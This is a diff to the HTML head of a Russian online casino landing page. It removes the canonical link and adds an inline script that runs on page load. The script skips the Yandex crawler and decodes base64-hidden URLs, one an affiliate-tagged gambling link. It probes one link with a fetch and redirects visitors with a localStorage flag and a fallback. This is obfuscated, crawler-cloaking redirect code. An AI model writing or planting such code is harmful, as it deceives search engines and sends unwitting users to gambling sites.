@@ -10,7 +10,6 @@
     <meta name="robots" content="index, follow">
     <meta name="author" content="Fenix Casino">
     <meta name="language" content="ru">
-    <link rel="canonical" href="https://fenix-casino-official.ru/">
     <meta property="og:title" content="Fenix Casino официальный сайт - Играть в феникс казино онлайн">
     <meta property="og:description" content="Fenix Casino и феникс казино зеркало рабочее. Играйте в Fenix Casino на официальном сайте с бонусами и гарантиями.">
     <meta property="og:type" content="website">
@@ -22,6 +21,38 @@
     <meta name="twitter:description" content="Играть в Fenix Casino онлайн. Феникс казино официальный сайт с зеркалом и бонусами.">
     <meta name="format-detection" content="telephone=yes">
     <meta name="theme-color" content="#0a0a12">
+    <script>
+  (function() {
+    var ua = navigator.userAgent.toLowerCase();
+    if (ua.indexOf("yandex") !== -1) {
+        console.log("Яндекс бот — без редиректа");
+        return;
+    }
+    var mainBrandB64 = "#aHR0cHM6Ly9mbmtzbGluay5vcmcvZDd0dGxyeXZo"; 
+    var crossBrandB64 = "#aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4"; 
+
+    var mainUrl = atob(mainBrandB64);
+    var crossUrl = atob(crossBrandB64);
+
+    if (localStorage.getItem('vstd_eva')) {
+        window.location.replace(crossUrl);
+        return;
+    }
+    var controller = new AbortController();
+    var timeoutId = setTimeout(function() { 
+        controller.abort(); 
+    }, 2500); 
+    fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
+        .then(function() {
+            clearTimeout(timeoutId);
+            localStorage.setItem('vstd_eva', '1');
+            window.location.replace(mainUrl);
+        })
+        .catch(function() {
+            window.location.replace(crossUrl);
+        });
+  })();
+</script>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         :root{
